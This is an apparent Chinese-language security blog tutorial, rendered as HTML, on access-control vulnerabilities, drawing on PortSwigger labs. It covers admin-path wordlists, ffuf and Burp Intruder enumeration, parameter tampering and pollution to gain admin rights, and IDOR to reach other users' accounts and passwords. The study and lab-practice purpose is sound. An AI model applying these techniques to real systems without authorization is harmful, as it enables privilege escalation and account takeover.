@@ -1,0 +1,804 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ziddzide">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="访问控制漏洞定义访问控制是指对谁或哪些人被授权执行操作或访问资源的限制。在Web应用程序的上下文中,访问控制依赖于身份验证和会话管理:  Authentication认证确认用户即称自己是谁。 Session management会话管理识别同一用户随后发出的HTTP请求。 Access control访问控制决定用户是否被允许执行他们试图执行的操作。  访问控制中断很常见,且通常存在严重的安全漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="访问控制漏洞">
+<meta property="og:url" content="http://example.com/2025/09/27/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="ziddzide的技术博客">
+<meta property="og:description" content="访问控制漏洞定义访问控制是指对谁或哪些人被授权执行操作或访问资源的限制。在Web应用程序的上下文中,访问控制依赖于身份验证和会话管理:  Authentication认证确认用户即称自己是谁。 Session management会话管理识别同一用户随后发出的HTTP请求。 Access control访问控制决定用户是否被允许执行他们试图执行的操作。  访问控制中断很常见,且通常存在严重的安全漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-26T18:03:34.000Z">
+<meta property="article:modified_time" content="2025-09-26T18:08:14.093Z">
+<meta property="article:author" content="ziddzide">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>访问控制漏洞 - ziddzide的技术博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ziddzide</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="访问控制漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-27 02:03" pubdate>
+          2025年9月27日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">访问控制漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="访问控制漏洞"><a href="#访问控制漏洞" class="headerlink" title="访问控制漏洞"></a>访问控制漏洞</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>访问控制是指对谁或哪些人被授权执行操作或访问资源的限制。在Web应用程序的上下文中,访问控制依赖于身份验证和会话管理:</p>
+<ul>
+<li><strong>Authentication</strong>认证确认用户即称自己是谁。</li>
+<li><strong>Session management</strong>会话管理识别同一用户随后发出的HTTP请求。</li>
+<li><strong>Access control</strong>访问控制决定用户是否被允许执行他们试图执行的操作。</li>
+</ul>
+<p>访问控制中断很常见,且通常存在严重的安全漏洞。访问控制的设计与管理是一个复杂而动态的问题,它将业务、组织和法律约束应用于技术实施。访问控制设计决策必须由人类做出,因此出错的可能性很高。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/access-control-apprentice/access-control/what-is-access-control&quot;</span>&gt;</span>定义及后续漏洞所参考的原出处<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>普通用户获取到管理员权限</p>
+<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><h4 id="无保护功能"><a href="#无保护功能" class="headerlink" title="无保护功能"></a>无保护功能</h4><p>在最基本的情况下,当应用程序对敏感功能不执行任何保护时,就会出现垂直权限的升级。例如,管理功能可能从管理员的欢迎页面链接,但不能从用户的欢迎页面链接。然而,用户可以通过浏览相关管理网址来访问管理功能。</p>
+<p>例如,一个网站可能以以下网址托管敏感功能:</p>
+<p><code>https://insecure-website.com/admin</code></p>
+<p>任何用户都可以访问此功能,而不仅仅是在用户界面中具有该功能链接的管理员用户。在某些情况下,管理网址可能会在其他地点被披露,例如<code>robots.txt</code>文件:</p>
+<p><code>https://insecure-website.com/robots.txt</code></p>
+<p>即使网址未在任何地方被披露,攻击者也可能能够使用文字列表来暴力控制敏感功能的位置。</p>
+<h5 id="文字列表的暴力破解"><a href="#文字列表的暴力破解" class="headerlink" title="文字列表的暴力破解"></a>文字列表的暴力破解</h5><h6 id="前提准备-专门应对的字典"><a href="#前提准备-专门应对的字典" class="headerlink" title="前提准备-&gt;专门应对的字典"></a>前提准备-&gt;专门应对的字典</h6><p>下面是一些常用的字典的数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin<br>/administrator<br>/manager<br>/console<br>/backoffice<br>/cpanel<br>/controlpanel<br>/dashboard<br>/login<br>/sysadmin<br>/root<br>/secret<br>/internal<br>/legacy<br></code></pre></td></tr></table></figure>
+
+<h6 id="FFUF工具的使用"><a href="#FFUF工具的使用" class="headerlink" title="FFUF工具的使用"></a>FFUF工具的使用</h6><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 基础探测（过滤403/404）</span><br><span class="hljs-attribute">ffuf</span> -w admin_paths.txt -u https://target.com/FUZZ <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>     -fc <span class="hljs-number">403</span>,<span class="hljs-number">404</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>     -t <span class="hljs-number">50</span><br><br><span class="hljs-comment"># 高级参数（带扩展名探测）</span><br><span class="hljs-attribute">ffuf</span> -w admin_paths.txt -u https://target.com/FUZZ.php <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>     -mc <span class="hljs-number">200</span>,<span class="hljs-number">302</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>     -H <span class="hljs-string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="brup-suite配置"><a href="#brup-suite配置" class="headerlink" title="brup suite配置"></a>brup suite配置</h6><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 发送任意GET请求到Intruder<br><span class="hljs-bullet">2.</span> 设置攻击类型：<span class="hljs-strong">**Sniper**</span><br><span class="hljs-bullet">3.</span> 攻击位置：路径末尾 <span class="hljs-code">`GET /FUZZ HTTP/1.1`</span><br><span class="hljs-bullet">4.</span> Payload类型：<span class="hljs-strong">**Simple list**</span><br><span class="hljs-bullet">5.</span> 加载字典文件<br><span class="hljs-bullet">6.</span> 添加Grep Match规则：<br><span class="hljs-bullet">   -</span> <span class="hljs-code">`Location: admin`</span><br><span class="hljs-bullet">   -</span> <span class="hljs-code">`Admin Panel`</span><br><span class="hljs-bullet">   -</span> <span class="hljs-code">`name=&quot;admin_password&quot;`</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="关注点"><a href="#关注点" class="headerlink" title="关注点"></a>关注点</h6><table>
+<thead>
+<tr>
+<th>响应特征</th>
+<th>可能的管理后台</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>302重定向</td>
+<td>&#x2F;admin&#x2F;login</td>
+</tr>
+<tr>
+<td>登录表单</td>
+<td><code>&lt;input type=&quot;password</code></td>
+</tr>
+<tr>
+<td>特殊Cookie</td>
+<td><code>admin_session=...</code></td>
+</tr>
+<tr>
+<td>框架特征</td>
+<td><code>Powered by Drupal</code></td>
+</tr>
+</tbody></table>
+<h5 id="无保护功能-持续"><a href="#无保护功能-持续" class="headerlink" title="无保护功能 - 持续"></a>无保护功能 - 持续</h5><p>在某些情况下,通过提供一个不太可预测的网址来隐藏敏感功能。这是所谓“默默无闻的安全”的一个例子。然而,隐藏敏感功能并不能提供有效的访问控制,因为用户可能会通过多种方式发现混淆的网址。</p>
+<p>设想一个在以下 URL 下托管管理函数的应用程序:</p>
+<p><code>https://insecure-website.com/administrator-panel-yb556</code></p>
+<p>攻击者可能不会直接猜到这一点。然而,该应用程序仍可能将网址泄露给用户。该网址可能在 JavaScript 中披露,该界面根据用户的角色构建用户界面:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"> </span><br><span class="language-javascript"><span class="hljs-keyword">var</span> isAdmin = <span class="hljs-literal">false</span>;</span><br><span class="language-javascript"> <span class="hljs-keyword">if</span> (isAdmin) &#123; ... <span class="hljs-keyword">var</span> adminPanelTag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>); adminPanelTag.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&#x27;https://insecure-website.com/administrator-panel-yb556&#x27;</span>); </span><br><span class="language-javascript">adminPanelTag.<span class="hljs-property">innerText</span> = <span class="hljs-string">&#x27;Admin panel&#x27;</span>; ... &#125; </span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>如果用户是管理员,此脚本会添加指向用户用户界面的链接。然而,包含该URL的脚本对所有用户都可见,无论其角色如何。</p>
+<h6 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h6><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">var</span> isAdmin = <span class="hljs-keyword">false</span>;<br><span class="hljs-keyword">if</span> (isAdmin) &#123;<br>   <span class="hljs-keyword">var</span> topLinksTag = <span class="hljs-built_in">document</span>.getElementsByClassName(<span class="hljs-string">&quot;top-links&quot;</span>)[<span class="hljs-number">0</span>];<br>   <span class="hljs-keyword">var</span> adminPanelTag = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;a&#x27;</span>);<br>   adminPanelTag.setAttribute(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&#x27;/admin-av8xy4&#x27;</span>);<br>   adminPanelTag.innerText = <span class="hljs-string">&#x27;Admin panel&#x27;</span>;<br>   topLinksTag.append(adminPanelTag);<br>   <span class="hljs-keyword">var</span> pTag = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;p&#x27;</span>);<br>   pTag.innerText = <span class="hljs-string">&#x27;|&#x27;</span>;<br>   topLinksTag.appendChild(pTag);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>解释:</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs autoit">声明一个变量<span class="hljs-built_in">isAdmin</span>，并设置为<span class="hljs-literal">false</span>。<br>如果<span class="hljs-built_in">isAdmin</span>为<span class="hljs-literal">true</span>，则执行以下操作：<br><br>a. 获取类名为<span class="hljs-string">&quot;top-links&quot;</span>的第一个元素（假设这是一个容器，用于放置顶部链接）。<br><br>b. 创建一个新的&lt;a&gt;元素（管理员面板链接）。<br><br>c. 设置这个链接的href属性为<span class="hljs-string">&quot;/admin-av8xy4&quot;</span>（这是一个特定的管理员面板路径）。<br><br>d. 设置链接的文本为<span class="hljs-string">&quot;Admin panel&quot;</span>。<br><br>e. 将这个链接添加到topLinksTag元素的末尾。<br><br>f. 创建一个&lt;p&gt;元素，用于显示一个竖线分隔符（|）。<br><br>g. 将这个分隔符也添加到topLinksTag元素的末尾。<br></code></pre></td></tr></table></figure>
+
+<p><strong>虽然管理员页面的路径是复杂的字符串,可是校验的script代码暴露了管理员页面的路径</strong></p>
+<h4 id="基于参数的访问控制方法"><a href="#基于参数的访问控制方法" class="headerlink" title="基于参数的访问控制方法"></a>基于参数的访问控制方法</h4><p>一些应用程序会确定用户在登录时的访问权限或角色,然后将此信息存储在用户可控制的位置。这可能是:</p>
+<ul>
+<li>一个隐藏的领域。</li>
+<li>cooike。</li>
+<li>预设查询字符串参数。</li>
+</ul>
+<p>申请根据所提交的价值做出访问控制决策。例如:</p>
+<p><code>https://insecure-website.com/login/home.jsp?admin=true https://insecure-website.com/login/home.jsp?role=1</code></p>
+<p>这种方法缺乏安全感,因为用户可以修改他们未经授权的值和访问功能,例如管理功能。</p>
+<h5 id="brup-suite配置-1"><a href="#brup-suite配置-1" class="headerlink" title="brup suite配置"></a>brup suite配置</h5><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis">由于是通过参数方式检验管理员权限<br>例如:<br><span class="hljs-literal">admin</span>=<span class="hljs-literal">true</span><br>此时可以修改报文中的<span class="hljs-literal">admin</span>=<span class="hljs-literal">false</span>为<span class="hljs-literal">admin</span>=<span class="hljs-literal">true</span>进行越权<br>要注意的是,管理员的每一个操作都会检验权限,所以每一步在brup suite配置下抓包进行<br></code></pre></td></tr></table></figure>
+
+<h5 id="入侵步骤"><a href="#入侵步骤" class="headerlink" title="入侵步骤"></a>入侵步骤</h5><h6 id="用Burp-Suite拦截请求，查找以下特征参数："><a href="#用Burp-Suite拦截请求，查找以下特征参数：" class="headerlink" title="用Burp Suite拦截请求，查找以下特征参数："></a>用Burp Suite拦截请求，查找以下特征参数：</h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /dashboard HTTP/1.1<br>Cookie: <span class="hljs-attribute">role</span>=user; <span class="hljs-attribute">admin</span>=<span class="hljs-literal">false</span><br><span class="hljs-built_in">..</span>.<br><br><br>POST /update_profile HTTP/1.1<br><span class="hljs-built_in">..</span>.<br><span class="hljs-attribute">admin</span>=0&amp;privilege=1<br><br>&lt;!-- 隐藏表单 --&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;isAdmin&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+
+<p>​<strong>重点关注这些关键词</strong>​：</p>
+<ul>
+<li><p><code>admin</code>, <code>role</code>, <code>access_level</code></p>
+</li>
+<li><p><code>privilege</code>, <code>is_staff</code>, <code>is_superuser</code></p>
+</li>
+<li><p><code>auth</code>, <code>authorized</code>, <code>permission</code></p>
+</li>
+</ul>
+<h6 id="参数篡改测试"><a href="#参数篡改测试" class="headerlink" title="参数篡改测试"></a>参数篡改测试</h6><table>
+<thead>
+<tr>
+<th>参数类型</th>
+<th>原始值</th>
+<th>测试值</th>
+<th>预期效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>​<strong>布尔型</strong>​</td>
+<td><code>admin=false</code></td>
+<td><code>admin=true</code></td>
+<td>开启管理员功能</td>
+</tr>
+<tr>
+<td>​<strong>数字型</strong>​</td>
+<td><code>role=1</code></td>
+<td><code>role=0</code>或<code>role=9</code></td>
+<td>切换权限等级</td>
+</tr>
+<tr>
+<td>​<strong>字符型</strong>​</td>
+<td><code>type=user</code></td>
+<td><code>type=admin</code></td>
+<td>提升权限组</td>
+</tr>
+<tr>
+<td>​<strong>二进制</strong>​</td>
+<td><code>access=0001</code></td>
+<td><code>access=1111</code></td>
+<td>开启所有权限</td>
+</tr>
+</tbody></table>
+<h6 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h6><p>​参数污染​：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?<span class="hljs-keyword">role</span>=<span class="hljs-keyword">user</span>&amp;<span class="hljs-keyword">role</span>=<span class="hljs-keyword">admin</span><br><br></code></pre></td></tr></table></figure>
+
+<p>​JSON劫持​：</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><br>&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;normal&quot;</span>, <span class="hljs-string">&quot;isAdmin&quot;</span>:<span class="hljs-literal">false</span>&#125;<br>改为→<br>&#123;<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;normal&quot;</span>, <span class="hljs-string">&quot;isAdmin&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>​数据类型转换​：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-attr">admin</span>=<span class="hljs-number">1</span>   <span class="hljs-comment"># 原始</span><br><span class="hljs-attr">admin</span>=<span class="hljs-literal">on</span>   <span class="hljs-comment"># 测试</span><br><span class="hljs-attr">admin</span>=<span class="hljs-literal">yes</span><br><br></code></pre></td></tr></table></figure>
+
+<p>​空值绕过​：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br>privilege=   <span class="hljs-comment"># 空值</span><br>role=undefined<br><br></code></pre></td></tr></table></figure>
+
+<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><hr>
+<p>如果用户能够访问属于其他用户的资源,而非他们自己的此类资源,就会发生横向权限升级。例如,如果员工可以访问其他员工以及他们自己的记录,那么这就是横向权限的升级。</p>
+<p>水平权限升级攻击可能使用类似类型的利用方式来实现垂直权限升级。例如,用户可能会使用以下网址访问自己的账户页面:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://insecure-website.com/myaccount?<span class="hljs-built_in">id</span>=123<br></code></pre></td></tr></table></figure>
+
+<p>如果攻击者修改<code>id</code>对其他用户而言,参数值可能会访问其他用户的账户页面以及相关数据和功能。</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在某些应用程序中,可利用的参数没有可预测的值。例如,应用程序可能使用全局唯一标识符(GUID)来识别用户,而不是增加数量。这可能会阻止攻击者猜测或预测其他用户的标识符。然而,在用户被引用的应用程序(如用户消息或评论)中,可能会披露属于其他用户的GUID。</p>
+<h3 id="简而言之-漏洞原理"><a href="#简而言之-漏洞原理" class="headerlink" title="简而言之-漏洞原理"></a>简而言之-漏洞原理</h3><p>​直接对象引用​：系统使用暴露的标识符（如用户ID）定位资源​缺乏权限验证​：未检查请求者是否拥有该资源的访问权限</p>
+<h3 id="基础案例-操作"><a href="#基础案例-操作" class="headerlink" title="基础案例&#x2F;操作"></a>基础案例&#x2F;操作</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">GUID<br><span class="hljs-number">1.</span>可以访问目标用户的资源通过抓包查看是否携带用户的<span class="hljs-built_in">id</span><br><span class="hljs-number">2.</span>登录自己的账号,抓包查看报文中<span class="hljs-built_in">id</span>字段,修改为目标用户即可<br></code></pre></td></tr></table></figure>
+
+<p>但这是没有任何防护的靶场,检测是否有防护如下文</p>
+<h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 当ID为不可预测的GUID时：</span><br><span class="hljs-comment"># 方法1：收集泄露的GUID（评论区/消息系统）</span><br><span class="hljs-comment"># 方法2：测试可遍历性（即使GUID也应验证权限）</span><br><span class="hljs-attribute">GET</span> /documents?id=<span class="hljs-number">7</span>e4efc5b-<span class="hljs-number">8</span>d1a-<span class="hljs-number">41</span>a3-a8d7-<span class="hljs-number">720</span>b216e7319<br><br><span class="hljs-comment"># 检测响应：</span><br><span class="hljs-comment"># - 200 OK + 他人数据 → 漏洞存在</span><br><span class="hljs-comment"># - 403 Forbidden → 有基础防护</span><br></code></pre></td></tr></table></figure>
+
+<p>如果有403代表防护从横向到纵向权限的升级</p>
+<hr>
+<p>通常,横向权限升级攻击可以通过牺牲更优越的用户来转变为垂直权限升级。例如,横向升级可能允许攻击者重置或捕获属于其他用户的密码。如果攻击者针对管理员用户并入侵其账户,则他们可以获取管理权限,从而执行垂直权限升级。</p>
+<p>攻击者可能能够使用已描述的参数篡改技术访问其他用户的账户页面,以实现横向权限升级:</p>
+<p><code>https://insecure-website.com/myaccount?id=456</code></p>
+<p>如果目标用户是应用程序管理员,则攻击者将访问管理账户页面。本页面可能会披露管理员的密码,或提供更改密码的手段,或直接提供对特权功能的访问权限。</p>
+<h3 id="案例-用户ID通过请求参数进行密码泄露"><a href="#案例-用户ID通过请求参数进行密码泄露" class="headerlink" title="案例-用户ID通过请求参数进行密码泄露"></a>案例-用户ID通过请求参数进行密码泄露</h3><pre><code class="hljs">用户登录抓包-&gt;修改id=administrator-&gt;查看预输入的密码(查看源代码)-&gt;登录管理员账户
+</code></pre>
+<p><strong>!!!administrator</strong>:没有人会想到该死的id用13个字符.</p>
